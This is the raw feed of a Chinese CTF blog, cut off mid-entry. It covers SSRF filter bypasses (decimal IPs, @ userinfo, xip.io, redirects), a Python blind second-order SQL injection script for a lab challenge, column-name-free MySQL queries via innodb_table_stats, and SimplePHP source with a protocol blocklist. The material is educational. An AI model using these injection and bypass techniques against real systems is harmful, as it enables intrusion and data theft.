http:&#x2F;&#x2F;[::]:80&#x2F; &gt;&gt;&gt; <a href="http://127.0.0.1/">http://127.0.0.1</a></p><p>　　9.句号绕过         127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p><p>　　10.利用302跳转绕过   使用服务器进行中间跳转</p><p>@：<br><a href="http://www.baidu.com@10.10.10.10/">http://www.baidu.com@10.10.10.10</a> 与 http?&#x2F;10.10.10.10 请求是相同的</p><p>过滤绕过<br>IP地址转换成十进制：</p><p>127.0.0.1 先转换为十六进制  7F000001 两位起步所以 1就是01</p><p>7F000001转换为二进制<br>127.0.0.1&#x3D;2130706433 最终结果</p><p><a href="https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031182450845-1767037149.png"><img src="https://s2.loli.net/2022/12/18/GEsC6Breb48F5Wg.png" alt="img"></a></p><p><a href="https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031182515515-597164973.png"><img src="https://s2.loli.net/2022/12/18/kJOqfpFIMsR7Kxv.png" alt="img"></a></p><p>还有根据域名判断的，比如xip.io域名，就尝试如下方法</p><p><a href="http://xip.io/">xip.io</a><br><a href="http://xip.io127.0.0.1.xip.io/">xip.io127.0.0.1.xip.io</a> –&gt;127.0.0.1<br><a href="http://www.127.0.0.1.xip.io/">www.127.0.0.1.xip.io</a> –&gt;127.0.0.1<br><a href="http://haha.127.0.0.1.xip.io/">Haha.127.0.0.1.xip.io</a> –&gt;127.0.0.1<br><a href="http://haha.xixi.127.0.0.1.xip.io/">Haha.xixi.127.0.0.1.xip.io</a> –&gt;127.0.0.1</p></blockquote><h3 id="SSRF常见限制"><a href="#SSRF常见限制" class="headerlink" title="SSRF常见限制"></a>SSRF常见限制</h3><ul><li><strong>限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</strong></li></ul><p>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code></p><ul><li><strong>2限制请求IP不为内网地址</strong></li></ul><p>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p><ul><li><strong>限制请求只为http协议</strong></li></ul><p>（1）采取302跳转<br>（2）采取短地址</p><p><img src="https://s2.loli.net/2022/12/18/zeZDc7qm6EfrYWg.png" alt="img"></p><p><img src="https://s2.loli.net/2022/12/18/ApFV7LQyNRn8K1q.png" alt="img"></p><h3 id="SSRF漏洞的修复建议："><a href="#SSRF漏洞的修复建议：" class="headerlink" title="SSRF漏洞的修复建议："></a>SSRF漏洞的修复建议：</h3><blockquote><p>　　1.限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。</p><p>　　2.限制不能访问内网的IP，以防止对内网进行攻击。</p><p>　　3.屏蔽返回的详细信息。</p></blockquote><p><a href="https://www.cnblogs.com/miruier/p/13907150.html">相关链接</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF打FastCGI</title>
    <link href="/2023/08/24/SSRF%E6%89%93FastCGI/"/>
    <url>/2023/08/24/SSRF%E6%89%93FastCGI/</url>
    
    <content type="html"><![CDATA[<h2 id="SSRF打FastCGI"><a href="#SSRF打FastCGI" class="headerlink" title="SSRF打FastCGI"></a>SSRF打FastCGI</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSRF打FastCGI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unfinish</title>
    <link href="/2023/08/24/Unfinish/"/>
    <url>/2023/08/24/Unfinish/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>登录进去，发现<code>login.php</code>，然后目录扫描发现 <code>register.php</code></p><p>注册后登陆进去，发现显示出来了我们的用户名username，这个是二次注入</p><img src="https://s2.loli.net/2023/05/14/1wzRMkjAbtovp8L.png" alt="image-20230514180724754" style="zoom:50%;" /><p>我们猜测插入数据库的语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xxx <span class="hljs-keyword">values</span>(email,username,password);<br></code></pre></td></tr></table></figure><p>这里又学到一个新的东西：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/14/iveQg159RwbOLHz.png" alt="image-20230514181149881"></p><p>这样查询出来的结果为0，但是如果我们将 <code>database()</code> 进行hex编码：</p><p><img src="https://s2.loli.net/2023/05/14/Nxiy2vfUlEDbncO.png" alt="image-20230514181141241"></p><p>发现可以查询出数据库名被hex编码后的结果</p><p>我们想用这样的思路查询flag：</p><p><img src="https://s2.loli.net/2023/05/14/LRqQ9grasn7vKxc.png" alt="image-20230514181349021"></p><p><img src="https://s2.loli.net/2023/05/14/aiLuU64zFAG2yTD.png" alt="image-20230514181255328"></p><p>发现hex值被截断了，因为其中包含了英文字母，我们再次hex编码一次：</p><p><img src="https://s2.loli.net/2023/05/14/2kQOc9qJHuLnPBm.png" alt="image-20230514181426680"></p><p>我们发现flag两次hex编码后的值成了科学计数法，这样就可以逐字符盲注了。</p><p>还有另一种方法，使用<code>ascii()</code>将字符转为ascii码，这样就可以慢慢盲注了</p><p>但是我们不知道库名、表名、列名，这里别人是选择盲猜，猜flag在flag表中</p><p>我们先爆破一下过滤了哪些字符，发现 <code>information</code> <code>,</code> 被过滤了</p><p><img src="https://s2.loli.net/2023/05/14/yXrRnZ3FsQoepCB.png" alt="image-20230514182015544"></p><p>由于是逐字符获取，所以我们需要使用 <code>substr()</code> 但是这个函数需要使用逗号。</p><p>但是有不需要逗号的写法： <code>substr(xxx from 1 for 1)</code></p><p>我们直接写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://62a3620e-e0a1-429c-8a2e-2afabf3aca80.node4.buuoj.cn:81/&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    login = url + <span class="hljs-string">&quot;login.php&quot;</span><br>    register = url + <span class="hljs-string">&quot;register.php&quot;</span><br>    time.sleep(<span class="hljs-number">0.5</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        dataR = &#123;<br>            <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#125;2@x.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        dataL = &#123;<br>            <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#125;2@x.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        requests.post(url=register,data=dataR)<br>        log = requests.post(url=login,data=dataL)<br>        soup = BeautifulSoup(log.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        flag = soup.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>        num = <span class="hljs-built_in">int</span>(flag.text)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(num),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">if</span>  __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br><br></code></pre></td></tr></table></figure><p>这里复习了一下 爬虫的 bs4模块：</p><blockquote><p>BeautifulSoup4 (bs4) 是一个 Python 的 HTML&#x2F;XML 解析库，<strong>用于从 HTML 或 XML 中提取数据</strong>。它提供了多种方法来定位和提取 HTML 或 XML 标记（tag），包括以下常用方法：</p><ol><li><p><code>BeautifulSoup()</code>：将 HTML 或 XML 文档转换为一个 BeautifulSoup 对象，便于使用各种方法提取数据。</p></li><li><p><code>find()</code> 和 <code>find_all()</code>：在 HTML 或 XML 文档中查找指定的标签或一组标签，并返回一个或多个 Tag 对象。</p></li><li><p><code>get()</code>：获取指定标签的指定属性的值。</p></li><li><p><code>text</code> 属性：获取指定标签的文本内容。</p></li><li><p><code>prettify()</code>：将 BeautifulSoup 对象的 HTML 或 XML 格式化输出，以便于阅读和调试。</p></li></ol><p>以下是一个使用 bs4 的示例程序，演示如何从 HTML 文档中提取数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 发送 HTTP GET 请求，并获取响应内容</span><br>response = requests.get(<span class="hljs-string">&#x27;https://www.example.com/&#x27;</span>)<br>html_doc = response.content<br><br><span class="hljs-comment"># 将 HTML 文档转换为 BeautifulSoup 对象</span><br>soup = BeautifulSoup(html_doc, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br><span class="hljs-comment"># 查找第一个 h1 标签，并输出其文本内容</span><br>h1_tag = soup.find(<span class="hljs-string">&#x27;h1&#x27;</span>)<br><span class="hljs-built_in">print</span>(h1_tag.text)<br><br><span class="hljs-comment"># 查找所有 a 标签，并输出其 href 属性的值和文本内容</span><br>a_tags = soup.find_all(<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> a_tags:<br>    <span class="hljs-built_in">print</span>(a.get(<span class="hljs-string">&#x27;href&#x27;</span>), a.text)<br><br><span class="hljs-comment"># 格式化输出 BeautifulSoup 对象</span><br><span class="hljs-built_in">print</span>(soup.prettify())<br></code></pre></td></tr></table></figure><p>这个程序首先发送一个 HTTP GET 请求，获取 <a href="https://www.example.com/">https://www.example.com/</a> 的响应内容。然后将响应内容转换为 BeautifulSoup 对象，并使用各种方法从 HTML 文档中提取数据，包括查找标签、获取属性值和文本内容，以及格式化输出 BeautifulSoup 对象。</p></blockquote><p>这里我们使用了如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">soup = BeautifulSoup(log.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>flag = soup.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>num = <span class="hljs-built_in">int</span>(flag.text)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(num),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>先创建一个 <code>BeautifulSoup</code>对象，使用了html解析</p><p>然后使用对象的<code>find()</code>方法 ，用于查找 网页中第一个 <code>span</code>标签，并且类名为 <code>user-name</code> 的标签</p><p>然后使用了 <code>text</code>属性获取其中的文本，转为int后再转为字符输出</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>经过测试<code>mysql</code>中 <code>+</code>的作用是用来进行数学运算</p><p>两个数字相加，返回两数之和</p><p><img src="https://s2.loli.net/2023/05/14/KVg8NMCA3PujBfy.png" alt="image-20230514183620161"></p><p>一个字符数字与一个数字相加，返回两数之和：</p><p><img src="https://s2.loli.net/2023/05/14/W43bG1rIJNy9MEc.png" alt="image-20230514183710570"></p><p>一个字符与一个数字相加，返回数字本身：(把字符转化为了0，所以相加就是该数字)</p><p><img src="https://s2.loli.net/2023/05/14/42AiUgnSxKBXVkt.png" alt="image-20230514184144830"></p><p>两个字符相加，返回数字0：</p><p><img src="https://s2.loli.net/2023/05/14/UzhG2pOTuaMRPEC.png" alt="image-20230514184214402"></p><p>一个数字与一个以数字开头的字符串相加，返回该数字与该字符串第一个字符前的数字值之和</p><p>(原因可能是弱类型转化，把以数字开头的字符串后面的字符给去掉了)</p><p><img src="https://s2.loli.net/2023/05/14/BALFxZ6aNh8blwg.png" alt="image-20230514184326783"></p><p>以字符开头的字符串与数值型相加，该字符串值为0</p><p><img src="https://s2.loli.net/2023/05/14/kzKahwBOblPCij9.png" alt="image-20230514184551728"></p><p>空字符串与字符串相加，由于弱类型转化，所以为0</p><p><img src="https://s2.loli.net/2023/05/14/RatnBsTcpbHIm1Z.png" alt="image-20230514184730079"></p><p>所以本题需要将flag转化为数值，才能盲注出来</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Unfinish</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL无列名查询表中数据</title>
    <link href="/2023/08/24/SQL%E6%97%A0%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2%E8%A1%A8%E4%B8%AD%E6%95%B0%E6%8D%AE/"/>
    <url>/2023/08/24/SQL%E6%97%A0%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2%E8%A1%A8%E4%B8%AD%E6%95%B0%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="【SQL】无列名查询表中数据"><a href="#【SQL】无列名查询表中数据" class="headerlink" title="【SQL】无列名查询表中数据"></a>【SQL】无列名查询表中数据</h2><p>有些时候，我们可能获取不了mysql数据库，表中的字段名称，那么我们怎么查询表中的数据呢？</p><p>我们先来了解一下<strong>mysql 联合查询</strong>：</p><p><strong>联合查询前后两个表的字段数必须相等、并且查询出来的新表的字段名称为前一个表的字段名称</strong></p><p>例如：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304021737261.png" alt="img" style="zoom: 50%;" /><p> 我们此处有 user、product两个表，并且字段数都为3，</p><p>如果我们使用联合查询的话，查询出来的新表的字段名称为前面那张表字段名称：</p><img src="https://img-blog.csdnimg.cn/709a365c5a0d4ee2813bf875ef0aa646.png" alt="img" style="zoom: 50%;" /><p> 如图所示，查询的表字段为user表的字段名称。</p><p> 我们再补充一个知识点，</p><p>mysql中如果我们使用 <strong>select 2 from user ；</strong> 会查询出数字2来</p><p><img src="https://img-blog.csdnimg.cn/f64a9bc438774b9d935163a354077e73.png" alt="img"></p><p> 如果我们将2加上反引号 &#96; 将会查询名称为 2 的列，显然user表中是没有的：</p><p><img src="https://img-blog.csdnimg.cn/6de1ecef6145453887e92388713f22ff.png" alt="img"></p><p>好了，有了以上知识点，我们可以使用如下sql进行联合查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5ad196c8474f4872a710e1c2bc9d6cc7.png" alt="img"></p><p> 我们发现查询出的新表字段为 1，2，3</p><p>于是我们进行子查询：（查询新表的第二列，记得将2加上反引号 **&#96;**）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8cd81a02ab2145fbb6e6ed0e707f72d8.png" alt="img"></p><p> 我们发现报错了，这是因为：</p><blockquote><p><strong>每个派生出来的表都必须有一个自己的别名。 嵌套查询的时候子查询出来的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名。</strong></p></blockquote><p>因此，我们只需要把<strong>新表使用 as（可省略） 起别名：</strong></p><p>(此处我们将新表起别名为 tb)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>) <span class="hljs-keyword">as</span> tb;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/448763a4f82c4b3da94c962b0598dd1d.png" alt="img"></p><p> ok,我们已经不使用 字段名查询出来了表中的数据。</p><p>思考一个问题：如果反引号被禁用了怎么办？</p><p>我们可以将 新表的字段名使用 as 起别名即可：</p><p>(此处我们将新表的第二列起名为 b ，第三列起名为 c)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>) <span class="hljs-keyword">as</span> tb;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c74b947fb7e644a9a40cc48bad574687.png" alt="img"></p><p> 如上，我们使用 <strong>select b</strong> 查询出了新表第二列的数据。</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="如果mysql中-information-schema-使用不了，怎么查询所有的数据库名，表名？"><a href="#如果mysql中-information-schema-使用不了，怎么查询所有的数据库名，表名？" class="headerlink" title="如果mysql中 information_schema 使用不了，怎么查询所有的数据库名，表名？"></a>如果mysql中 <strong>information_schema</strong> 使用不了，怎么查询所有的数据库名，表名？</h4><blockquote><p>从MySQL 5.5开始，默认存储引擎称为InnoDB。在MySQL 5.5及更高版本中，如果执行“ select @@ innodb_version”，则可以看到InnoDB的版本，该版本与MySQL的版本几乎相同。</p><p>但是在MySQL 5.6及更高版本中，我注意到InnoDB创建了2个新表。“ <strong>innodb_index_stats</strong>”和“ <strong>innodb_table_stats</strong>”()这两个表都包含所有新创建的数据库和表的数据库和表名。</p></blockquote><p>我们可以使用 <strong>mysql库</strong>下的 <strong>innodb_table_stats表、innodb_index_stats表</strong></p><p><img src="https://img-blog.csdnimg.cn/40ebb65383be467ab63b98da37180606.png" alt="img"></p><p> 我们使用 <strong>innodb_table_stats表</strong> 查询数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.innodb_table_stats;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e0f2eb353fef4f0caa270e9dd3bf9cc9.png" alt="img"></p><p> 查询所有表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats;<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/8fdcc08151b340e9b147a945b103a82f.png" alt="img" style="zoom: 50%;" /><p> 查询指定数据库下所有表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/21d1c2a28cde4dea94e91d66d6369754.png" alt="img"></p><p><strong>mysql库</strong>下的 <strong>innodb_index_stats 表</strong></p><p><img src="https://img-blog.csdnimg.cn/3e459ffb2a4b49d59c4c43626ce515e4.png" alt="img"></p><p> 用法类似</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL无列名查询表中数据</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SimplePHP</title>
    <link href="/2023/08/24/SimplePHP/"/>
    <url>/2023/08/24/SimplePHP/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>首先打开主页，发现有几个功能：</p><p><img src="https://s2.loli.net/2023/03/23/CMBmpzwcXaZ75rs.png" alt="image-20230323150613411"></p><p>有一个查看文件，和一个上传文件。</p><p><img src="https://s2.loli.net/2023/03/23/tR2GCZFq3sQfbj6.png" alt="image-20230323150656909"></p><p>在查看文件中可以进行文件包含，读取出相关的php代码内容</p><p>我们通过读取<code>file.php</code>，一步一步读取出了6个php文件，由于有3个没用，所以我只放了三个文件出来</p><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span 